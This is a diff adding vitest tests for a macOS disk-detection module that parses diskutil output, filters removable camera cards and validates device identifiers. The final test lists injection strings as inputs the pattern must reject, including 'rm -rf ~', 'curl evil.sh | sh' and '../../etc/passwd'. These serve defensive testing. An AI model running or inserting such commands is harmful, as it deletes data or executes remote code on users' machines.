@@ -1,5 +1,11 @@
 import { describe, it, expect, vi } from 'vitest'
-import { parseLsblkTree, withDeadline, type LsblkTree } from './volume-watcher'
+import {
+  parseLsblkTree,
+  parseDiskutilList,
+  isRemovableDisk,
+  withDeadline,
+  type LsblkTree,
+} from './volume-watcher'
 
 /**
  * The lsblk filter, against trees this machine does not have.
@@ -171,6 +177,158 @@ describe('withDeadline', () => {
       expect(vi.getTimerCount()).toBe(0)
     } finally {
       vi.useRealTimers()
+    }
+  })
+})
+
+/**
+ * The macOS filter, against trees this machine does not have.
+ *
+ * Same stakes as the Linux one: the path guard trusts what comes out of
+ * here as a root the renderer may name, so a false positive is an offer
+ * to sweep the disk the Mac booted from.
+ */
+describe('parseDiskutilList', () => {
+  it('finds a card on a partitioned disk', () => {
+    expect(parseDiskutilList({
+      AllDisksAndPartitions: [{
+        DeviceIdentifier: 'disk4',
+        Partitions: [{
+          DeviceIdentifier: 'disk4s1',
+          MountPoint: '/Volumes/EOS_DIGITAL',
+          VolumeName: 'EOS_DIGITAL',
+        }],
+      }],
+    })).toEqual([{
+      deviceId: 'disk4s1',
+      mountPoint: '/Volumes/EOS_DIGITAL',
+      volumeName: 'EOS_DIGITAL',
+    }])
+  })
+
+  it('finds a card with no partition table, mounted as the whole disk', () => {
+    // An older camera formats the card as bare FAT32. Reading only
+    // `Partitions` would ignore exactly these.
+    const found = parseDiskutilList({
+      AllDisksAndPartitions: [{
+        DeviceIdentifier: 'disk4',
+        MountPoint: '/Volumes/NIKON',
+        VolumeName: 'NIKON',
+      }],
+    })
+    expect(found.map(c => c.deviceId)).toEqual(['disk4'])
+  })
+
+  it('walks APFS volumes, which hang off a container rather than a partition', () => {
+    const found = parseDiskutilList({
+      AllDisksAndPartitions: [{
+        DeviceIdentifier: 'disk3',
+        APFSVolumes: [
+          { DeviceIdentifier: 'disk3s1', MountPoint: '/Volumes/Shoots', VolumeName: 'Shoots' },
+        ],
+      }],
+    })
+    expect(found.map(c => c.mountPoint)).toEqual(['/Volumes/Shoots'])
+  })
+
+  it('skips unmounted partitions: there is nothing to read yet', () => {
+    expect(parseDiskutilList({
+      AllDisksAndPartitions: [{
+        DeviceIdentifier: 'disk4',
+        Partitions: [{ DeviceIdentifier: 'disk4s1', VolumeName: 'EOS_DIGITAL' }],
+      }],
+    })).toEqual([])
+  })
+
+  it('names an unlabelled volume rather than returning an empty string', () => {
+    const found = parseDiskutilList({
+      AllDisksAndPartitions: [{
+        DeviceIdentifier: 'disk4', MountPoint: '/Volumes/Untitled 1',
+      }],
+    })
+    expect(found[0].volumeName).toBe('Untitled')
+  })
+
+  it('survives a shape it does not recognise', () => {
+    expect(parseDiskutilList({})).toEqual([])
+    expect(parseDiskutilList(null)).toEqual([])
+    expect(parseDiskutilList({ AllDisksAndPartitions: [null, 7, 'nonsense'] })).toEqual([])
+  })
+})
+
+describe('isRemovableDisk', () => {
+  const card = { Ejectable: true, RemovableMedia: true, Internal: false, BusProtocol: 'USB' }
+
+  it('takes an ejectable card under /Volumes', () => {
+    expect(isRemovableDisk(card, '/Volumes/EOS_DIGITAL')).toBe(true)
+  })
+
+  it('takes a reader that reports RemovableMedia as a string', () => {
+    // The shape has moved across macOS versions; trusting one spelling
+    // would silently stop detecting cards after an OS update.
+    expect(isRemovableDisk(
+      { Ejectable: false, RemovableMedia: 'Removable', Internal: false },
+      '/Volumes/SD',
+    )).toBe(true)
+  })
+
+  it('refuses an internal disk even when it claims to be ejectable', () => {
+    expect(isRemovableDisk(
+      { Ejectable: true, RemovableMedia: false, Internal: true },
+      '/Volumes/Macintosh HD - Data',
+    )).toBe(false)
+  })
+
+  it('refuses the boot volume', () => {
+    expect(isRemovableDisk(card, '/')).toBe(false)
+    expect(isRemovableDisk(card, '/Volumes/Macintosh HD')).toBe(false)
+  })
+
+  it('refuses a system volume', () => {
+    expect(isRemovableDisk(card, '/System/Volumes/Data')).toBe(false)
+  })
+
+  it('refuses a network share, which is not media', () => {
+    expect(isRemovableDisk(
+      { Ejectable: true, RemovableMedia: true, Internal: false, BusProtocol: 'Network' },
+      '/Volumes/studio-nas',
+    )).toBe(false)
+  })
+
+  it('refuses a fixed external drive', () => {
+    expect(isRemovableDisk(
+      { Ejectable: false, RemovableMedia: false, Internal: false, BusProtocol: 'USB' },
+      '/Volumes/Backup',
+    )).toBe(false)
+  })
+
+  it('refuses anything mounted outside /Volumes', () => {
+    expect(isRemovableDisk(card, '/private/tmp/mine')).toBe(false)
+  })
+})
+
+describe('the macOS device identifier pattern', () => {
+  // The one value that reaches a command line. A volume name never
+  // does, because whoever formatted the card chose it.
+  const ok = (id: string) => /^disk\d+(s\d+)*$/.test(id)
+
+  it('accepts the identifiers the kernel assigns', () => {
+    for (const id of ['disk0', 'disk4', 'disk4s1', 'disk4s1s2']) {
+      expect(ok(id)).toBe(true)
+    }
+  })
+
+  it('rejects anything carrying shell metacharacters or a path', () => {
+    for (const id of [
+      'disk4; rm -rf ~',
+      'disk4 && curl evil.sh | sh',
+      '$(whoami)',
+      '`id`',
+      '../../etc/passwd',
+      'disk4\nrm -rf /',
+      '',
+    ]) {
+      expect(ok(id)).toBe(false)
     }
   })
 })
